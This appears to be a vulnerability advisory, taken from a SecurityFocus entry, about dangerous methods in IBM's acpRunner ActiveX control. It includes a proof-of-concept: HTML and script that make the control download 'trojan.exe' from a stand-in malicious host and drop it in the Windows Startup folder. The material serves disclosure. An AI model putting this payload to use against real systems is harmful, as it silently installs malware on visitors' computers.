@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/10561/info
+
+It is reported that the IBM acpRunner ActiveX control contains dangerous methods that may result in a remote compromise of a system on which the ActiveX control is installed. These methods may be accessed by a malicious website and may result in the silent installation of a malicious executable.
+
+A remote attacker may exploit this vulnerability in order to silently install a malicious executable on an affected system.
+
+|object width="310" height="20"
+codebase="https://www-3.ibm.com/pc/support/access/aslibmain/content/AcpC
+ontrol.cab" id="runner"
+classid="CLSID:E598AC61-4C6F-4F4D-877F-FAC49CA91FA3"
+data="DATA:application/x-oleobject;BASE64,YayY5W9MTU+Hf/rEnKkfowADAAAKIA
+AAEQIAAA==">
+|object|
+
+|script|
+runner.DownLoadURL = "http://malicioussystem/trojan.exe";
+runner.SaveFilePath = "\..\\Start Menu\\Programs\\Startup";
+runner.FileSize = 96,857;
+runner.FileDate = "01/09/2004 3:33";
+runner.DownLoad();
+|script|
